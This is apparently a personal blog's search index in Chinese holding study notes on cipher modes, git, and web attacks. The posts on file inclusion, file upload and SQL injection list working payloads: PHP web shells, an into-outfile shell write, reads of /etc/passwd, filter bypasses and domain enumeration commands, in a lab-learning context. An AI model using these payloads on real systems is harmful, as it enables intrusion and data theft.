<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>分组密码的工作模式</title>
      <link href="/2023/03/02/Working-mode-of-block-password/"/>
      <url>/2023/03/02/Working-mode-of-block-password/</url>
      
        <content type="html"><![CDATA[<h1>1. 电子密码本ECB (electronic codebook mode)</h1><p>在ECB模式中，将明文分组加密之后的结果将直接成为密文分组。</p><p><img src="/2023/03/02/Working-mode-of-block-password/1.png" alt></p><p>特点：</p><ol><li>简单和有效</li><li>可以并行实现</li><li>不能隐藏明文的模式信息：相同明文加密生成相同密文；同样信息多次出现造成泄漏</li><li>对明文的主动攻击是可能的。信息块可被替换、重排、删除、重放</li><li>误差传递：密文块损坏仅对应明文块损坏 适合于传输短信息</li></ol><p>一比特的明文密文错误只会影响该分组加解密，而不会影响到其他分组，但如果出现了密文中增加或丢失一些数据位，那么整个密文序列将不能正确解密。</p><h1>2. 密码分组链接CBC (cipher block chaining)</h1><p>CBC模式是将前一个密文分组与当前明文分组的内容混合起来进行加密的，这样就可以避免ECB模式的弱点。在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算（异或），然后再进行加密。</p><p><img src="/2023/03/02/Working-mode-of-block-password/2.png" alt></p><p>特点：</p><ol><li>没有已知的并行实现算法</li><li>能隐藏明文的模式信息：需要共同的初始向量IV；相同明文加密得到不同密文；初始向量IV可以用来改变第一块；定期更换IV（如果需要传递IV，要保证IV的完整性）</li><li>对明文的主动攻击是不容易的：信息块不容易被替换、重排、删除、重放；误差传递：密文块损坏会导致明文块损坏</li><li>安全性好于ECB</li><li>适合于传输长度大于64位的报文</li></ol><p>明文中发生一比特错误，会影响对应的密文分组以及之后的所有密文分组，但由于解密会反转这种影响，所以没有明文错误扩散。<br>密文中发生一比特错误，会影响对应解密明文分组和其后的一个解密明文分组。随后的那个分组在解密后在同样的bit位上有错误，但再之后的分组将不会再受影响。</p><h1>3. 密码反馈CFB (cipher feedback)</h1><p>在CFB模式中，前一个密文分组会被送回到密码算法的输入端。所谓反馈（feedback），这里指的就是返回输入端的意思。</p><p>CFB 模式中由密码算法所生成的二进制序列称为密钥流（key stream）。在CFB模式中，密码算法就相当于用来生成密钥流的伪随机数生成器，而初始化向量就相当于伪随机数生成器的“种子”。在CFB模式中，明文数据可以被逐比特加密，因此我们可以将CFB模式看做是一种使用分组密码来实现流密码的方式。</p><h2 id="3-1-CFB-模式加密">3.1. CFB 模式加密</h2><p><img src="/2023/03/02/Working-mode-of-block-password/3-1.png" alt></p><h2 id="3-2-CFB-模式解密">3.2. CFB 模式解密</h2><p><img src="/2023/03/02/Working-mode-of-block-password/3-2.png" alt></p><p>特点：</p><ol><li>分组密码自同步流密码</li><li>没有已知的并行实现算法</li><li>关于IV：为进行正常的加密和解密，发送与接收需要共同IV；IV应具有唯一性（即在密钥不变时，每次加密使用不同的IV）</li><li>优点：隐藏了明文模式</li><li>缺点：误差传递，一个单元损坏影响多个单元</li></ol><p>明文错误同CBC<br>密文错误一位会引起解密后对应明文的一位错误，错误进入移位寄存器，将导致加密步骤输出错误，直到该错误从寄存器移除，有良好的自同步性质</p><h1>4. 输出反馈OFB (output feedback)</h1><p>在OFB模式中，密码算法的输入会反馈到密码算法的输入中。OFB模式并不是通过密码算法对明文直接进行加密的，而是通过将“明文分组”和“密码算法的输出”进行XOR来产生“密文分组”的，在这一点上OFB模式和CFB模式非常相似。<br>由于CFB模式中是对密文分组进行反馈的，因此必须从第一个明文分组开始按顺序进行加密，也就是说无法跳过明文分组1而先对明文分组2进行加密。相对地，在OFB模式中，XOR所需要的比特序列（密钥流）可以事先通过密码算法生成，和明文分组无关。只要提前准备好所需的密钥流，则在实际从明文生成密文的过程中，就完全不需要动用密码算法了，只要将明文与密钥流进行XOR就可以了。这就意味着只要提前准备好密钥流就可以快速完成加密。换个角度来看，生成密钥流的操作和进行XOR运算的操作是可以并行的。</p><h2 id="4-1-OFB-模式加密">4.1. OFB 模式加密</h2><p><img src="/2023/03/02/Working-mode-of-block-password/4-1.png" alt></p><h2 id="3-2-OFB-模式解密">3.2. OFB 模式解密</h2><p><img src="/2023/03/02/Working-mode-of-block-password/4-2.png" alt></p><p>特点：</p><ol><li>没有已知的并行实现算法</li><li>优点：隐藏了明文模式；没有误差传递：一个单元损坏只影响对应单元</li><li>缺点：不具有自同步能力，要求系统要保持严格的同步；重新同步时需要新的IV，IV可以用明文形式传送</li><li>对明文的主动攻击是可能的，信息块可被替换、重排、删除、重放</li><li>安全性较CFB差</li></ol><p>明文在某位上发生的错误不会影响加密后密文其他位。<br>密文在某位上发生的错误不会影响解密后明文其他位。</p><h1>5. 计数器模式CTR (counter)</h1><p>CTR 模式是一种通过将逐次累加的计数器进行加密来生成密钥流的流密码。CTR 模式中，每个分组对应一个逐次累加的计数器，并通过对计数器进行加密来生成密钥流。也就是说，最终的密文分组是通过将计数器加密得到的比特序列，与明文分组进行XOR而得到的。<br>CTR模式和OFB模式一样，都属于流密码。OFB模式是将加密的输出反馈到输入，而CTR模式则是将计数器的值用作输入。</p><p><img src="/2023/03/02/Working-mode-of-block-password/5.png" alt></p><p>特点：</p><ol><li>硬件效率：允许同时处理多块明/密文</li><li>软件效率：允许并行计算</li><li>预处理</li><li>随机访问</li><li>可证明安全性：能够证明CTR至少和其他模式一样安全</li><li>简单性：只需要实现加密算法</li><li>无填充：可以高效地作为密钥流使用</li></ol><p>CTR模式也具备和OFB模式类似的性质。如果CTR模式的密文分组有一个比特反转了，则解密后的明文分组中仅有与之对应的比特会被反转，这一错误不会放大。明文加密与之类似。</p><h1>6. 工作模式选用原则</h1><ul><li>ECB模式，简单、高速，但最弱，易受重发攻击，一般不推荐；</li><li>CBC,CFB,OFB,CTR的选择取决于实用特殊考虑；</li><li>CBC适用于文件加密，但较ECB慢，且需要另加移存器和组的异或运算，但安全性加强。软件加密最好选用此种方式；</li><li>OFB和CFB较CBC慢许多，每次迭代只有少数bit完成加密。若可以容忍少量错误扩展，可选CFB。否则，可选OFB或CTR;</li><li>在字符为单元的流密码种多选CFB模式，如终端和主机间通信。而OFB或CTR用于高速同步系统，不容忍差错传播。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习文件包含漏洞</title>
      <link href="/2023/02/27/learn-file-include-vulnerability/"/>
      <url>/2023/02/27/learn-file-include-vulnerability/</url>
      
        <content type="html"><![CDATA[<h1>1.文件包含漏洞条件</h1><p>开发者在开发过程中，会将可以重复利用的函数或代码块写入到单个文件当中，在使用某些函数时，直接调用对应即可，无需再次编写，这种调用文件的过程称之为文件包含</p><ol><li>包含文件时采用动态包含的方式</li><li>对于包含的文件没有做详细的过滤和检验</li></ol><p>PHP文件包含函数：include()、 include_once()、 require()、 require_once()、 fopen()、 readfile()<br>通过以上函数包含文件，无论文件后缀是什么，都会以php的方式进行解析</p><p>其它语言的文件包含：</p><ol><li>JSP文件包含函数：java.io.file()、java.io.filereader()、include()，动态包含只支持包含web路径下的jsp文件</li><li>aspx文件包含函数：include file、include virtual，aspx和asp均不支持动态包含</li></ol><h1>2.文件包含漏洞分类</h1><h2 id="2-1-本地文件包含-LFI">2.1. 本地文件包含(LFI)</h2><p>包含文件和页面文件如果不在同一目录，包含的路径必须写相对路径或者绝对路径</p><p>被包含的文件的后缀无论是是什么都被被视作为PHP进行解析</p><p>本地包含任意文件 <code>../</code>、 <code>..\</code></p><p><strong>追加后缀</strong>：%00截断，受限于php的版本</p><p><strong>追加前缀</strong>：在文件路径前多一次跳转</p><p>包含日志文件，然后在User-Agent等地方上传一句话：</p><ul><li>/var/log/apache2/access.log</li><li>/var/log/httpd/access.log</li><li>/var/log/nginx/access.log</li></ul><h2 id="2-2-远程文件包含-RFI">2.2. 远程文件包含(RFI)</h2><p>代码注入的一种，通过包含的方式远程注入一段用户可控的脚本在服务端执行</p><p>远程注入前提条件：</p><ul><li>allow_url_fopen ON</li><li>allow_url_include ON</li><li>包含的变量前没有目录的限制</li><li>远程包含文件路径必须为绝对路径</li><li>被包含的文件能被服务器解析</li></ul><p>临时启动http服务–python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">8000</span></span><br><span class="line">python2 -m SimpleHTTPServer <span class="number">8000</span></span><br></pre></td></tr></table></figure><p>伪协议利用：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://     //远程文件包含，python启用服务</span><br><span class="line">ftp://</span><br><span class="line">php://filter/read=convert.base64-encode/resource=</span><br><span class="line">file:///ect/passwd</span><br><span class="line">php://input</span><br><span class="line">phar://压缩包路径/文件名称</span><br><span class="line">zip://压缩包路径#文件名称    //记住#可能需要转码为%23</span><br><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></pre></td></tr></table></figure><p>日志路径为常见路径/var/log/apache2/access.log，注意日志文件包含</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>域内基本信息查询及操作</title>
      <link href="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/"/>
      <url>/2023/02/25/Querying-and-operating-basic-information-in-a-domain/</url>
      
        <content type="html"><![CDATA[<h1>1. 判断当前所在域</h1><p>查看计算机名、全名、用户名、系统版本、工作站、域、登录域: <code>net config workstation</code></p><p><img src="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/1.png" alt></p><h1>2. 查看域信任关系</h1><p>域内用户信息查询等操作，只有system权限用户和域用户才有权限执行。</p><p><code>nltest /domain_trusts</code></p><p><img src="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/2.png" alt></p><h1>3. 查看本机/域用户列表</h1><p><code>net user</code> 查看本机的用户账户</p><p><img src="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/3-1.png" alt></p><p><code>net user /domain</code> 或 <code>net time /domain</code> 查看域控主机的用户账户和其他用户列表</p><p><img src="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/3-2.png" alt></p><h1>4. 确定域控主机名称及IP</h1><p>利用nslookup或者ping可解析IP</p><p><img src="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/4.png" alt></p><h1>5. 查看域里面的工作组，把用户分成了哪些组</h1><p><code>net group /domain</code></p><p><img src="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/5.png" alt></p><h1>6. 查看域中分组信息</h1><p>查看域中Domain Admins组，<code>net group &quot;Domain Admins&quot; /domain</code></p><p><img src="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/6-1.png" alt></p><p><code>net group &quot;Domain Computers&quot; /domain</code></p><p><img src="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/6-2.png" alt></p><p><code>net group &quot;Domain Controllers&quot; /domain</code></p><p><img src="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/6-3.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习文件上传漏洞</title>
      <link href="/2023/02/25/learn-file-upload-vulnerability/"/>
      <url>/2023/02/25/learn-file-upload-vulnerability/</url>
      
        <content type="html"><![CDATA[<h1>1.文件上传漏洞条件</h1><ol><li>上传文件的名称、后缀名、内容用户可以自定义设置；</li><li>上传文件的路径可以获取；</li><li>上传文件所在文件夹具备可执行权限；</li></ol><h1>2. Bypass 技巧</h1><ol><li>前端过滤</li></ol><p>抓包修改后缀名、禁用JS</p><ol start="2"><li>类型过滤</li></ol><p>上传图片马、修改后缀名<br>制作图片马: <code>copy 1.jpg/b+muma.php/a muma.jpg</code><br>图片类文件头: <code>GIF89a</code></p><ol start="3"><li>黑名单过滤</li></ol><p>禁用php后缀名时，使用畸形后缀名：phtml、php3、php4、php5、pht、php2</p><ol start="4"><li>上传 .htaccess 文件，更改解析配置</li></ol><p>AddType application/x-httpd-php .jpg：将 jpg 文件当成 php 进行解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">配置方式：</span><br><span class="line">1. 将 httpd.config 中的 Option FollowSymLinks 从 AllowOverride None 修改为 ALLowOverride all</span><br><span class="line">2. 将 LoadModule rewrite_module modules/mod_rewrite.so 前的 # 去除</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li>windows特性绕过</li></ol><p>windows保存文件时，后缀末尾不会保存 <code>.</code>、 <code>空格</code>、 <code>::$DATA</code></p><p>可以尝试将 <code>muma.php</code> 修改为：<code>muma.php.</code>、<code>muma.php空格</code>、<code>muma.php.空格.</code>、<code>muma.php::$DATA</code></p><ol start="6"><li>大小写绕过</li></ol><p>将 <code>php</code> 修改为 <code>phP</code>、<code>pHp</code> 等</p><p>将禁用的函数<code>eval</code>等进行大小写</p><ol start="7"><li><p>双写绕过</p></li><li><p>%00截断</p></li></ol><p>对 php 版本和配置有要求。PHP版本=5.2.17，且 php.ini 中 magic_quotes_gpc Off</p><ol start="9"><li>一些小知识</li></ol><p><strong>图片类文件头</strong>: <code>GIF89a</code></p><p><strong>命令执行函数</strong>:</p><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>eval</td><td>命令执行</td></tr><tr><td>system</td><td>命令执行</td></tr><tr><td>assert</td><td>与eval类似，assert函数是直接将传入的参数字符串当成PHP代码直接</td></tr><tr><td>exec</td><td>命令执行，需要打印输出执行结果，且它只会输出最后一行的内容</td></tr></tbody></table><p><strong>读取文件</strong>：<code>cat</code>、 <code>tac</code>、 <code>less</code>、 <code>more</code>、 <code>head</code>、 <code>tail</code>、 <code>strings</code>、 <code>paste</code>、 <code>nl</code>、 <code>//</code></p><p><strong>变量拼接</strong>：</p><p><code>assert</code>, <code>system</code>可以动态拼接（php 版本小于8），<code>eval</code>不可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;ass&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;ert&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>重新认识SQL注入</title>
      <link href="/2023/02/18/Relearn-sql-injection/"/>
      <url>/2023/02/18/Relearn-sql-injection/</url>
      
        <content type="html"><![CDATA[<h1>前期工作</h1><p>找寻注入点</p><p>判断注入类型（数字型/字符型）</p><p>字符型注入判断闭合方式：<code>' 、 &quot; 、 ) 、 ') 、 &quot;) 、 %) 、 %</code></p><p>判断注释方式：<code>%23 、# 、 --+ 、 %00</code></p><p>然后利用 and 连接条件进行最后判断是否存在注入点</p><p>万能密码登录：username=admin’ or ‘1’='1<br>对应sql语句可能为：<code>select username,password from users where username='$username' and password='$password' limit 0,1;</code></p><h1>1. 联合注入</h1><p>有回显时：</p><p>利用 order by 判断列数</p><p><code>?id='1' order by 3 --+</code></p><p>利用 union select 判断回显位置</p><p><code>?id='-1' union select 1,2,3 --+</code></p><p>查库名、用户名</p><p><code>?id='-1' union select 1,database(),user() --+</code></p><p>查询表名</p><p><code>?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'   --+</code></p><p>查询列名</p><p><code>?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'  --+</code></p><p>查询字段值</p><p><code>?id=-1' union select 1,group_concat(id,':',username,':',password),3 from users  --+</code></p><p>读取文件</p><p><code>?id=-1' union select 1,load_file(&quot;/etc/passwd&quot;),3  --+</code></p><p>写入文件</p><p><code>?id=-1' union select 1,&quot;&lt;?php @eval($_POST['c']);?&gt;&quot;,3 into outfile &quot;/var/www/html/muma.php&quot; --+</code></p><p>hex绕过</p><p><code>?id=-35 union select 1,2,user(),4,5,6,7,8,9,10,unhex(hex(group_concat(table_name))),12,13,14,15 from information_schema.tables where table_schema='cms' %23</code></p><h1>2. 报错注入</h1><p>无回显时：</p><h2 id="2-1-floor-报错注入">2.1. floor()报错注入</h2><p>原理可查看这篇文章 --&gt; <a href="https://blog.csdn.net/cried_cat/article/details/80022378">floor()函数报错分析</a></p><p>查数据库名</p><p><code>?id=1' union select null,count(*),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a%23</code></p><p>查表名</p><p><code>?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))as a from information_schema.tables group by a%23</code></p><p>查列名</p><p><code>?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='users' limit 2,1),floor(rand(0)*2))as a from information_schema.tables group by a%23</code></p><p>查字段值</p><p><code>?id=1' union select 1,count(*),concat((select username from users limit 0,1),floor(rand(0)*2))as a from information_schema.tables group by a%23</code></p><h2 id="2-2-extractvalue报错注入">2.2. extractvalue报错注入</h2><p><code>extractValue(doc,'book/author/surname')</code><br><code>extractValue(列名，book标签下面的author标签下面的surname标签里面的内容)</code></p><p>原理可查看这篇文章 <a href="https://blog.csdn.net/sugar_by/article/details/125098528">sql盲注_extractvalue报错注入</a></p><p>利用报错查询数据库名</p><p><code>?id=1' and extractvalue(1,concat(0x7e,(select database()))) --+</code></p><p>查询当前数据库的表</p><p><code>?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA=database()))) --+</code></p><p>查询列名</p><p><code>?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name ='users'))) --+</code></p><p>查询字段名</p><p><code>?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,'~',password) from users)))--+</code></p><p>默认只能返回32字符串，如果返回内容过长，可利用substr分段显示</p><p><code>?id=1' and extractvalue(1,concat(0x7e,(select substring((select group_concat(username,'~',password) from users),25,30))))--+</code></p><h2 id="2-3-updatexml报错注入">2.3. updatexml报错注入</h2><p>updatexml报错注入和extractvalue报错注入的原理基本差不多，都是利用插入不符合函数格式的语句并拼接查询语句从而通过函数报错达到我们查询内容的目的；</p><p>基本格式：<code>updatexml(xml_doument,XPath_string,new_value)</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个参数：XML的内容</span><br><span class="line">第二个参数：是需要update的位置XPATH路径</span><br><span class="line">第三个参数：是更新后的内容</span><br></pre></td></tr></table></figure><p>所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式，其最终还是因为路径产生报错从而达到报错的目的；</p><p>对第二个参数的修改与 <code>2.2. extractvalue报错注入</code> 对第二个参数的修改基本一致</p><h1>3. 盲注</h1><h2 id="3-1-布尔盲注">3.1. 布尔盲注</h2><p>查数据库长度</p><p><code>?id=1' and length(database())=8 --+</code></p><p>查询数据库名，不断替换 substr() 的参数</p><p><code>?id=1' and ascii(substr(database(),1,1))=115 --+</code></p><p>查询数据库中表的数量</p><p><code>?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=3 --+</code></p><p>查询表名的长度</p><p><code>?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 --+</code></p><blockquote><p>注意length()里面的select语句整体要加上()</p></blockquote><p>查询表名</p><p><code>?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1))&gt;95 --+</code></p><p>查询表中列的数量</p><p><code>?id=1' and (select count(column_name) from information_schema.columns where table_name='users')=3 --+</code></p><p>查询列名的长度</p><p><code>?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1))&gt;7 --+</code></p><p>查询列名</p><p><code>?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))=105 --+</code></p><p>查询字段的数量</p><p><code>?id=1' and (select count(username) from users)&gt;12 --+</code></p><p>查询字段的长度</p><p><code>?id=1' and length((select username from users limit 0,1))&gt;1 --+</code></p><p>查询字段名</p><p><code>?id=1' and ascii(substr((select username from users limit 0,1),1,1))=68 --+</code></p><h2 id="3-2-时间盲注">3.2. 时间盲注</h2><p>无论输入什么，都返回同样的内容</p><p>判断是否存在时间盲注</p><p><code>?id=1' and if(1=1,sleep(10),1) --+</code></p><p>判断数据库长度</p><p><code>?id=1' and if(length(database())&gt;1,sleep(10),1) --+</code></p><blockquote><p>其余与布尔盲注基本相同，只需替换if中的条件判断</p></blockquote><h1>4. 堆叠注入</h1><p>在SQL中，<code>;</code> 是用来表示一条 sql 语句的结束，在结束一个sql语句后继续构造下一条语句，两条 sql 语句一起执行就造就了堆叠注入。</p><p>查询用户数：<code>?id=-1'union select 1,(select count(username) from users),3 --+</code></p><p>显示有十四条数据：</p><p><img src="/2023/02/18/Relearn-sql-injection/4-1.png" alt></p><p>堆叠注入：<code>?id=1';insert into users(id,username,password) values ('40','less39','hello') --+</code></p><p>查询用户数：<code>?id=-1'union select 1,(select count(username) from users),3 --+</code></p><p>显示有十八条数据：</p><p><img src="/2023/02/18/Relearn-sql-injection/4-2.png" alt></p><h1>5. 二次注入</h1><p>第一阶段：将想要利用的特殊字符（’ 、&quot; 、#）通过正当逻辑，写入到数据库中<br>第二阶段：通过正常逻辑调用写入的特殊字符</p><p>插入注册qq’#用户时可以成功注册</p><p>修改密码 sql语句可能为：<code>update users set password='$new_password' where username='qq'#' and password='$old_password' ;</code></p><p>更改用户密码时，成功修改qq用户的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">SP(注册qq&#x27;#)--&gt; A(注册成功)</span><br><span class="line">A--&gt;B(登陆修改密码)</span><br><span class="line">B--&gt;C(修改成功)</span><br><span class="line">B--&gt;D(修改失败)</span><br><span class="line">C--&gt;E(使用修改后的密码登录)</span><br><span class="line">E--&gt;F(登录qq&#x27;#失败)</span><br><span class="line">E--&gt;G(登录qq&#x27;#成功)</span><br><span class="line">F--&gt;H(尝试登陆qq)</span><br><span class="line">H--&gt;J(登陆成功)</span><br><span class="line">G--&gt;K(闭合方式猜测错误)</span><br><span class="line">K--&gt;L(更换特殊字符再次测试)</span><br><span class="line">SP--&gt;M(注册失败)</span><br><span class="line">M--&gt;N(不存在二次注入)</span><br><span class="line">D--&gt;O(&quot;系统不存在qq的账户，闭合方式猜想正确&quot;)</span><br><span class="line">O--&gt;P(更换用户名再次测试)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>6. insert注入</h1><p><code>insert into article VALUES ($a,'$b','$c','$d')</code></p><p>可以控制 $b 和 $c 的传入</p><p>令 <code>$b = a',database(),'1') #</code></p><p>可构造 <code>insert into article VALUES ($a,'a',database(),'1') #</code> 查询数据库名为<code>easy</code></p><p>接着查询表名</p><p>令 <code>$b = a',(select group_concat(table_name) from information_schema.tables where table_schema='easy'),'1') #</code></p><h1>Bypass技巧</h1><p>空格过滤：用 <code>/**/</code> ，<code>%0a</code>代替空格</p><p>关键字被过滤：尝试双写绕过，如将 union 修改为 <code>uunionnion</code></p><p>注释符（# 、 --+）被过滤：用 <code>;%00</code> 进行截断</p><p><code>=</code> 被过滤：使用 <code>like</code> 替代</p><p><code>and</code>，<code>or</code>被过滤：1. 用 <code>&amp;&amp;</code>，<code>||</code> 代替 （注意url编码<code>%26%26</code>，<code>%7C%7C</code>）。2. 用大小写绕过</p><p><code>select</code> 被过滤：大小写绕过</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git学习</title>
      <link href="/2023/02/15/git-learn/"/>
      <url>/2023/02/15/git-learn/</url>
      
        <content type="html"><![CDATA[<h1>1. pull request 同步原仓库</h1><ol><li><p>创建分支：<code>git branch test/update-readme</code></p></li><li><p>切换分支：<code>git checkout test/update-readme</code></p></li></ol><blockquote><p>前两行代码可合并为 git checkout -b test/update-readme</p></blockquote><ol start="3"><li>查看远程分支状态：<code>git remote -v </code></li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">origin  git@github.com:dengjiawen8955/pr-test.git (fetch)</span><br><span class="line">origin  git@github.com:dengjiawen8955/pr-test.git (push)</span><br></pre></td></tr></table></figure><ol start="4"><li><p>添加一个新的upstream 分支 指向「原仓库」地址：<code>git remote add upstream https://github.com/bmft-team/pr-test.git</code></p></li><li><p>确认是否添加成功：<code>git remote -v</code></p></li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">origin  git@github.com:dengjiawen8955/pr-test.git (fetch)</span><br><span class="line">origin  git@github.com:dengjiawen8955/pr-test.git (push)</span><br><span class="line">upstream        https://github.com/bmft-team/pr-test.git (fetch)</span><br><span class="line">upstream        https://github.com/bmft-team/pr-test.git (push)</span><br></pre></td></tr></table></figure><ol start="6"><li>从「原仓库」拉取最新的代码：<code>git fetch upstream</code></li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">remote: Enumerating objects: 6, done.</span><br><span class="line">remote: Counting objects: 100% (6/6), done.</span><br><span class="line">remote: Compressing objects: 100% (3/3), done.</span><br><span class="line">remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (4/4), 1.33 KiB | 47.00 KiB/s, done.</span><br><span class="line">From https://github.com/bmft-team/pr-test</span><br><span class="line"> * [new branch]      master     -&gt; upstream/master </span><br></pre></td></tr></table></figure><ol start="7"><li>查看自己所在的分支：<code>git branch</code></li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  master</span><br><span class="line">* test/update-readme</span><br></pre></td></tr></table></figure><ol start="8"><li>合并 upstream 分支到 master 分支：<code>git merge upstream/master</code></li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Updating e2b016c..774d228</span><br><span class="line">Fast-forward</span><br><span class="line"> API.md | 1 +</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 API.md</span><br></pre></td></tr></table></figure><ol start="9"><li>将 master 分支合并到 test/update-readme 分支（此时你的分支为test/update-readme）：<code>git merge master</code></li></ol><blockquote><p>6 7 8 9 步骤可以合并为一步 git pull upstream upstream的x分支<br>含义: 将远程upstream仓库的x分支合并到当前分支</p></blockquote><ol start="10"><li>提交代码</li></ol><p><code>git add .</code><br><code>git commit -m &quot;update README.md and sync the source repository&quot;</code><br><code>git push origin test/update-readme</code></p><p>ps:<br><code>git branch -a  //查看本地分支及远程分支</code><br><code>git branch -D featuer   //删除本地 featuer 分支</code></p><h1>2. git 配置全局设置</h1><p>配置http代理</p><p><code>git config --global http.proxy 127.0.0.1:7890</code><br><code>git config --global https.proxy 127.0.0.1:7890</code></p><p>取消配置http代理</p><p><code>git config --global --unset http.proxy</code><br><code>git config --global --unset https.proxy</code></p><p>配置socks5代理</p><p><code>git config --global http.proxy socks5 127.0.0.1:7890</code><br><code>git config --global https.proxy socks5 127.0.0.1:7890</code></p><h1>3. 更改 github 账号后 push 出现的问题</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Enumerating objects: 12, done.</span><br><span class="line">Counting objects: 100% (12/12), done.</span><br><span class="line">Delta compression using up to 16 threads</span><br><span class="line">Compressing objects: 100% (7/7), done.</span><br><span class="line">Writing objects: 100% (9/9), 301.45 KiB | 30.14 MiB/s, done.</span><br><span class="line">Total 9 (delta 1), reused 1 (delta 0), pack-reused 0</span><br><span class="line">remote: Resolving deltas: 100% (1/1), completed with 1 local object.</span><br><span class="line">To https://github.com/Thunderinmoonlight/diSE.git</span><br><span class="line"> ! 